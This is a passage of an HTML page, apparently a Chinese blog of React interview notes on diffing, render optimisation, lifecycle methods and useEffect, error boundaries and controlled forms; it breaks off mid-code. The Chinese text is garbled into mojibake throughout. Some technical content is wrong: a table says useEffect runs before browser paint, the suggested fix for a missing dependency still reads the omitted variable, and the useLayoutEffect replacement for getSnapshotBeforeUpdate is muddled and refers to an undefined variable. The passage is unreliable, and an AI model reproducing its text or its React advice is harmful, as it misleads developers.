Diffï¼Ÿ</strong></p><p>ç®—æ³•åŸç†ï¼š</p><ul><li>ä»…åŒå±‚æ¯”è¾ƒï¼ˆæ·±åº¦ä¼˜å…ˆéå†ï¼‰</li><li>ç±»å‹ä¸åŒæ—¶è·³è¿‡å­æ ‘æ¯”è¾ƒ</li><li>åˆ—è¡¨ä½¿ç”¨ key åŒ¹é…å‡å°‘ç§»åŠ¨å¼€é”€</li></ul><h3 id="æ€§èƒ½ä¼˜åŒ–æŠ€å·§"><a href="#æ€§èƒ½ä¼˜åŒ–æŠ€å·§" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–æŠ€å·§"></a>æ€§èƒ½ä¼˜åŒ–æŠ€å·§</h3><p><strong>é¿å…ä¸å¿…è¦èŠ‚ç‚¹å˜åŠ¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ æ¯æ¬¡æ¸²æŸ“åˆ›å»ºæ–°å¯¹è±¡ï¼ˆå¯¼è‡´å­ç»„ä»¶é‡æ¸²æŸ“ï¼‰</span><br>&lt;<span class="hljs-title class_">Child</span> style=&#123;&#123; <span class="hljs-attr">color</span>: <span class="hljs-string">&#x27;red&#x27;</span> &#125;&#125; /&gt;<br><br><span class="hljs-comment">// âœ… æå–é™æ€å¯¹è±¡</span><br><span class="hljs-keyword">const</span> staticStyle = &#123; <span class="hljs-attr">color</span>: <span class="hljs-string">&#x27;red&#x27;</span> &#125;;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;staticStyle&#125;</span> /&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>åˆ—è¡¨æ¸²æŸ“ä¼˜åŒ–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ ç´¢å¼•ä½œä¸º keyï¼ˆåˆ—è¡¨å˜åŒ–æ—¶çŠ¶æ€é”™ä¹±ï¼‰</span><br>&#123;todos.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">todo, index</span>) =&gt;</span> <br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">TodoItem</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;index&#125;</span> <span class="hljs-attr">todo</span>=<span class="hljs-string">&#123;todo&#125;</span> /&gt;</span></span><br>)&#125;<br><br><span class="hljs-comment">// âœ… ç¨³å®š ID ä½œä¸º key</span><br>&#123;todos.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> <br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">TodoItem</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;todo.id&#125;</span> <span class="hljs-attr">todo</span>=<span class="hljs-string">&#123;todo&#125;</span> /&gt;</span></span><br>)&#125;<br></code></pre></td></tr></table></figure><p><strong>ç»„ä»¶æ ‘ç»“æ„ä¼˜åŒ–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ æ·±å±‚åµŒå¥—å¯¼è‡´ Diff èŒƒå›´å¤§</span><br>&lt;<span class="hljs-title class_">App</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Header</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">UserPanel</span>&gt;</span>  // çŠ¶æ€å˜åŒ–å½±å“æ•´ä¸ª Header</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Avatar</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">UserPanel</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">Header</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">App</span>&gt;<br><br><span class="hljs-comment">// âœ… çŠ¶æ€ä¸‹æ²‰ + ç»„ä»¶ææƒ</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">UserPanel</span>&gt;</span>   // ç‹¬ç«‹æ›´æ–°</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Avatar</span> /&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">UserPanel</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">App</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="React-18-å¹¶å‘æ¸²æŸ“ä¼˜åŒ–"><a href="#React-18-å¹¶å‘æ¸²æŸ“ä¼˜åŒ–" class="headerlink" title="React 18 å¹¶å‘æ¸²æŸ“ä¼˜åŒ–"></a>React 18 å¹¶å‘æ¸²æŸ“ä¼˜åŒ–</h3><p><strong>å¯ä¸­æ–­æ¸²æŸ“</strong></p><pre class="mermaid">graph LRA[é«˜ä¼˜å…ˆçº§æ›´æ–°] --> B[ä¸­æ–­å½“å‰æ¸²æŸ“]B --> C[æ‰§è¡Œç´§æ€¥ä»»åŠ¡]C --> D[æ¢å¤æ¸²æŸ“]</pre><p><strong>è‡ªåŠ¨æ‰¹å¤„ç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React 17ï¼šä»…äº‹ä»¶å¤„ç†å‡½æ•°å†…æ‰¹å¤„ç†</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setCount</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-title function_">setFlag</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// ä¸¤æ¬¡ç‹¬ç«‹æ›´æ–°</span><br>&#125;, <span class="hljs-number">100</span>);<br><br><span class="hljs-comment">// React 18ï¼šæ‰€æœ‰æ›´æ–°è‡ªåŠ¨æ‰¹å¤„ç†</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setCount</span>(<span class="hljs-number">1</span>);   <span class="hljs-comment">// åˆå¹¶ä¸ºä¸€æ¬¡æ›´æ–°</span><br>  <span class="hljs-title function_">setFlag</span>(<span class="hljs-literal">true</span>);<br>&#125;, <span class="hljs-number">100</span>);<br></code></pre></td></tr></table></figure><h2 id="2-2-ç”Ÿå‘½å‘¨æœŸï¼ˆç±»ç»„ä»¶ç”Ÿå‘½å‘¨æœŸã€useEffect-æ›¿ä»£æ–¹æ¡ˆï¼‰"><a href="#2-2-ç”Ÿå‘½å‘¨æœŸï¼ˆç±»ç»„ä»¶ç”Ÿå‘½å‘¨æœŸã€useEffect-æ›¿ä»£æ–¹æ¡ˆï¼‰" class="headerlink" title="2.2 ç”Ÿå‘½å‘¨æœŸï¼ˆç±»ç»„ä»¶ç”Ÿå‘½å‘¨æœŸã€useEffect æ›¿ä»£æ–¹æ¡ˆï¼‰"></a>2.2 ç”Ÿå‘½å‘¨æœŸï¼ˆç±»ç»„ä»¶ç”Ÿå‘½å‘¨æœŸã€useEffect æ›¿ä»£æ–¹æ¡ˆï¼‰</h2><h3 id="ç±»ç»„ä»¶ç”Ÿå‘½å‘¨æœŸå…¨æ™¯å›¾"><a href="#ç±»ç»„ä»¶ç”Ÿå‘½å‘¨æœŸå…¨æ™¯å›¾" class="headerlink" title="ç±»ç»„ä»¶ç”Ÿå‘½å‘¨æœŸå…¨æ™¯å›¾"></a>ç±»ç»„ä»¶ç”Ÿå‘½å‘¨æœŸå…¨æ™¯å›¾</h3><pre class="mermaid">graph TD  A[æŒ‚è½½é˜¶æ®µ] --> B[constructor]  B --> C[static getDerivedStateFromProps]  C --> D[render]  D --> E[componentDidMount]    F[æ›´æ–°é˜¶æ®µ] --> G[static getDerivedStateFromProps]  G --> H[shouldComponentUpdate]  H --> I[render]  I --> J[getSnapshotBeforeUpdate]  J --> K[componentDidUpdate]    L[å¸è½½é˜¶æ®µ] --> M[componentWillUnmount]    N[é”™è¯¯å¤„ç†] --> O[static getDerivedStateFromError]  O --> P[componentDidCatch]</pre><p>å„é˜¶æ®µæ ¸å¿ƒæ–¹æ³•ï¼š</p><table><thead><tr><th align="left">é˜¶æ®µ</th><th align="left">æ–¹æ³•</th><th align="left">æ‰§è¡Œæ—¶æœº</th><th align="left">å¸¸è§ç”¨é€”</th></tr></thead><tbody><tr><td align="left">æŒ‚è½½</td><td align="left">constructor</td><td align="left">ç»„ä»¶åˆå§‹åŒ–</td><td align="left">åˆå§‹åŒ– stateï¼Œç»‘å®š this</td></tr><tr><td align="left">æŒ‚è½½</td><td align="left">render</td><td align="left">åˆ›å»ºè™šæ‹Ÿ DOM</td><td align="left">è¿”å› JSX å†…å®¹</td></tr><tr><td align="left">æŒ‚è½½</td><td align="left">componentDidMount</td><td align="left">DOM æŒ‚è½½å®Œæˆ</td><td align="left">ç½‘ç»œè¯·æ±‚ã€è®¢é˜…äº‹ä»¶</td></tr><tr><td align="left">æ›´æ–°</td><td align="left">shouldComponentUpdate</td><td align="left">æ¸²æŸ“å‰æ‹¦æˆª</td><td align="left">æ€§èƒ½ä¼˜åŒ–ï¼ˆè¿”å› false é˜»æ­¢æ›´æ–°ï¼‰</td></tr><tr><td align="left">æ›´æ–°</td><td align="left">getSnapshotBeforeUpdate</td><td align="left">DOM æ›´æ–°å‰</td><td align="left">è·å–æ»šåŠ¨ä½ç½®ç­‰ DOM ä¿¡æ¯</td></tr><tr><td align="left">æ›´æ–°</td><td align="left">componentDidUpdate</td><td align="left">DOM æ›´æ–°å®Œæˆ</td><td align="left">åŸºäºæ–° DOM æ“ä½œ</td></tr><tr><td align="left">å¸è½½</td><td align="left">componentWillUnmount</td><td align="left">ç»„ä»¶å¸è½½å‰</td><td align="left">æ¸…ç†å®šæ—¶å™¨ã€å–æ¶ˆè®¢é˜…</td></tr><tr><td align="left">é”™è¯¯</td><td align="left">componentDidCatch</td><td align="left">å­ç»„ä»¶æŠ›å‡ºé”™è¯¯</td><td align="left">é”™è¯¯æ—¥å¿—ã€æ˜¾ç¤ºé™çº§ UI</td></tr></tbody></table><h3 id="å‡½æ•°ç»„ä»¶-useEffect-æ›¿ä»£æ–¹æ¡ˆ"><a href="#å‡½æ•°ç»„ä»¶-useEffect-æ›¿ä»£æ–¹æ¡ˆ" class="headerlink" title="å‡½æ•°ç»„ä»¶ useEffect æ›¿ä»£æ–¹æ¡ˆ"></a>å‡½æ•°ç»„ä»¶ useEffect æ›¿ä»£æ–¹æ¡ˆ</h3><p>ç”Ÿå‘½å‘¨æœŸæ˜ å°„å…³ç³»ï¼š</p><pre class="mermaid">graph LR  A[componentDidMount] --> B["useEffect(() => {}, [])"]  C[componentDidUpdate] --> D["useEffect(() => {}, [deps])"]  E[componentWillUnmount] --> F["useEffect(() => { return cleanup }, [])"]  G[shouldComponentUpdate] --> H[React.memo æˆ– useMemo]</pre><h3 id="æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ-1"><a href="#æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ-1" class="headerlink" title="æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ"></a>æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ</h3><p><strong>useEffect æ‰§è¡Œæ—¶æœº</strong></p><table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">æ‰§è¡Œé˜¶æ®µ</th><th align="left">æ˜¯å¦é˜»å¡æ¸²æŸ“</th><th align="left">è®¿é—® DOM</th></tr></thead><tbody><tr><td align="left">componentDidMount</td><td align="left">æµè§ˆå™¨ç»˜åˆ¶å</td><td align="left">æ˜¯</td><td align="left">å¯è®¿é—®</td></tr><tr><td align="left">componentDidUpdate</td><td align="left">æµè§ˆå™¨ç»˜åˆ¶å</td><td align="left">æ˜¯</td><td align="left">å¯è®¿é—®</td></tr><tr><td align="left">useEffect</td><td align="left">æµè§ˆå™¨ç»˜åˆ¶å‰</td><td align="left">å¦ï¼ˆå¼‚æ­¥ï¼‰</td><td align="left">å¯è®¿é—®ï¼ˆä½†éœ€æ³¨æ„æ—¶æœºï¼‰</td></tr><tr><td align="left">useLayoutEffect</td><td align="left">DOM å˜æ›´åï¼Œç»˜åˆ¶å‰</td><td align="left">æ˜¯ï¼ˆåŒæ­¥ï¼‰</td><td align="left">å¯è®¿é—®</td></tr></tbody></table><p><strong>ä¾èµ–æ•°ç»„ç²¾å¦™ä¹‹å¤„</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âœ… å®‰å…¨ï¼šåŒ…å«æ‰€æœ‰ä¾èµ–</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> total = price * quantity;<br>  <span class="hljs-title function_">setTotal</span>(total);<br>&#125;, [price, quantity]); <br><br><span class="hljs-comment">// âŒ å±é™©ï¼šç¼ºå°‘ä¾èµ–ï¼ˆä½¿ç”¨è¿‡æœŸçŠ¶æ€ï¼‰</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> total = price * quantity;<br>  <span class="hljs-title function_">setTotal</span>(total);<br>&#125;, [price]); <span class="hljs-comment">// ç¼ºå°‘ quantity</span><br><br><span class="hljs-comment">// âœ… è§£å†³æ–¹æ¡ˆï¼šå‡½æ•°å¼æ›´æ–°</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setTotal</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> price * quantity);<br>&#125;, [price]); <span class="hljs-comment">// ä¸å†ä¾èµ– quantity</span><br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-2"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-2" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆ useEffect å¯èƒ½æ‰§è¡Œä¸¤æ¬¡ï¼Ÿ</strong></p><p>React 18+ ä¸¥æ ¼æ¨¡å¼è¡Œä¸ºï¼š</p><ul><li>å¼€å‘ç¯å¢ƒä¸‹æ•…æ„åŒè°ƒç”¨ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;<span class="hljs-title class_">React</span>.<span class="hljs-property">StrictMode</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span> &#123;<span class="hljs-comment">/* useEffect æŒ‚è½½/å¸è½½å„æ‰§è¡Œä¸¤æ¬¡ */</span>&#125;<br>&lt;/<span class="hljs-title class_">React</span>.<span class="hljs-property">StrictMode</span>&gt;<br></code></pre></td></tr></table></figure><ul><li>ç›®çš„ï¼šæ£€æµ‹ä¸çº¯æ¸²æŸ“ï¼ˆä¾‹å¦‚æœªæ­£ç¡®å®ç°æ¸…ç†ï¼‰</li><li>è§£å†³æ–¹æ¡ˆï¼šç¡®ä¿æ¸…ç†å‡½æ•°å®Œå…¨å¤åŸåˆå§‹çŠ¶æ€</li></ul><p><strong>Qï¼šå¦‚ä½•æ›¿ä»£ shouldComponentUpdateï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ–¹æ¡ˆ1ï¼šReact.memo æµ…æ¯”è¾ƒ</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">&#123; data &#125;</span>) =&gt;</span> &#123; ... &#125;);<br><br><span class="hljs-comment">// æ–¹æ¡ˆ2ï¼šè‡ªå®šä¹‰æ¯”è¾ƒ</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<br>  <span class="hljs-function">(<span class="hljs-params">&#123; data &#125;</span>) =&gt;</span> &#123; ... &#125;,<br>  <span class="hljs-function">(<span class="hljs-params">prevProps, nextProps</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> prevProps.<span class="hljs-property">id</span> === nextProps.<span class="hljs-property">id</span>; <span class="hljs-comment">// è‡ªå®šä¹‰æ¯”è¾ƒé€»è¾‘</span><br>  &#125;<br>);<br><br><span class="hljs-comment">// æ–¹æ¡ˆ3ï¼šuseMemo æ§åˆ¶å­ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> memoizedChild = <span class="hljs-title function_">useMemo</span>(<br>    <span class="hljs-function">() =&gt;</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;complexData&#125;</span> /&gt;</span></span>,<br>    [complexData] <span class="hljs-comment">// ä»… complexData å˜åŒ–æ—¶é‡å»º</span><br>  );<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;memoizedChild&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Qï¼šgetSnapshotBeforeUpdate å¦‚ä½•æ›¿ä»£ï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç±»ç»„ä»¶</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ScrollList</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">getSnapshotBeforeUpdate</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-property">scrollHeight</span>;<br>  &#125;<br>  <br>  <span class="hljs-title function_">componentDidUpdate</span>(<span class="hljs-params">prevProps, prevState, snapshot</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-property">scrollTop</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-property">scrollHeight</span> - snapshot;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// å‡½æ•°ç»„ä»¶ï¼šuseLayoutEffect + useRef</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ScrollList</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> listRef = <span class="hljs-title function_">useRef</span>();<br>  <span class="hljs-keyword">const</span> lastScrollHeight = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// DOM æ›´æ–°åï¼Œç»˜åˆ¶å‰æ‰§è¡Œï¼ˆç±»ä¼¼ getSnapshotBeforeUpdateï¼‰</span><br>    lastScrollHeight.<span class="hljs-property">current</span> = listRef.<span class="hljs-property">current</span>.<span class="hljs-property">scrollHeight</span>;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-comment">// æ¸…ç†é˜¶æ®µç›¸å½“äº getSnapshotBeforeUpdate</span><br>      <span class="hljs-keyword">const</span> snapshot = listRef.<span class="hljs-property">current</span>.<span class="hljs-property">scrollHeight</span>;<br>      listRef.<span class="hljs-property">current</span>.<span class="hljs-property">scrollTop</span> += listRef.<span class="hljs-property">current</span>.<span class="hljs-property">scrollHeight</span> - lastScrollHeight.<span class="hljs-property">current</span>;<br>    &#125;;<br>  &#125;, [items]);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é”™è¯¯è¾¹ç•Œï¼ˆError-Boundariesï¼‰ç‰¹æ®Šè¯´æ˜"><a href="#é”™è¯¯è¾¹ç•Œï¼ˆError-Boundariesï¼‰ç‰¹æ®Šè¯´æ˜" class="headerlink" title="é”™è¯¯è¾¹ç•Œï¼ˆError Boundariesï¼‰ç‰¹æ®Šè¯´æ˜"></a>é”™è¯¯è¾¹ç•Œï¼ˆError Boundariesï¼‰ç‰¹æ®Šè¯´æ˜</h3><p><strong>ç±»ç»„ä»¶ä¸“å±èƒ½åŠ›</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span> &#125;;<br>  <br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getDerivedStateFromError</span>(<span class="hljs-params">error</span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">true</span> &#125;;<br>  &#125;<br>  <br>  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, info</span>) &#123;<br>    <span class="hljs-title function_">logErrorToService</span>(error, info.<span class="hljs-property">componentStack</span>);<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span><br>      ? <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FallbackComponent</span> /&gt;</span></span><br>      : <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å‡½æ•°ç»„ä»¶è§£å†³æ–¹æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“ react-error-boundary</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">ErrorBoundary</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-error-boundary&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> <span class="hljs-attr">FallbackComponent</span>=<span class="hljs-string">&#123;ErrorFallback&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">UnstableComponent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-å—æ§ç»„ä»¶-vs-éå—æ§ç»„ä»¶ï¼ˆè¡¨å•å¤„ç†ï¼‰"><a href="#2-3-å—æ§ç»„ä»¶-vs-éå—æ§ç»„ä»¶ï¼ˆè¡¨å•å¤„ç†ï¼‰" class="headerlink" title="2.3 å—æ§ç»„ä»¶ vs. éå—æ§ç»„ä»¶ï¼ˆè¡¨å•å¤„ç†ï¼‰"></a>2.3 å—æ§ç»„ä»¶ vs. éå—æ§ç»„ä»¶ï¼ˆè¡¨å•å¤„ç†ï¼‰</h2><h3 id="æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”"><a href="#æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”" class="headerlink" title="æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”"></a>æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”</h3><table><thead><tr><th>ç‰¹æ€§</th><th>å—æ§ç»„ä»¶</th><th>éå—æ§ç»„ä»¶</th></tr></thead><tbody><tr><td>æ•°æ®ç®¡ç†</td><td>React state å®Œå…¨æ§åˆ¶</td><td>DOM èŠ‚ç‚¹è‡ªèº«ç®¡ç†</td></tr><tr><td>å€¼è·å–</td><td>value å±æ€§</td><td>ref è®¿é—® DOM èŠ‚ç‚¹</td></tr><tr><td>å€¼æ›´æ–°</td><td>onChange äº‹ä»¶ + setState</td><td>ç”¨æˆ·ç›´æ¥è¾“å…¥</td></tr><tr><td>åˆå§‹åŒ–</td><td>value å±æ€§</td><td>defaultValue&#x2F;defaultChecked</td></tr><tr><td>è¡¨å•æäº¤</td><td>ä» state è·å–</td><td>ä» ref è·å–</td></tr><tr><td>å®æ—¶éªŒè¯</td><td>å®¹æ˜“å®ç°</td><td>éœ€è¦æ‰‹åŠ¨ç›‘å¬äº‹ä»¶</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>å¤æ‚è¡¨å•ã€å³æ—¶éªŒè¯</td><td>ç®€å•è¡¨å•ã€æ–‡ä»¶ä¸Šä¼ </td></tr></tbody></table><h3 id="å—æ§ç»„ä»¶æ·±åº¦è§£æ"><a href="#å—æ§ç»„ä»¶æ·±åº¦è§£æ" class="headerlink" title="å—æ§ç»„ä»¶æ·±åº¦è§£æ"></a>å—æ§ç»„ä»¶æ·±åº¦è§£æ</h3><p><strong>å®ç°åŸç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ControlledForm</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useState</span>(<span 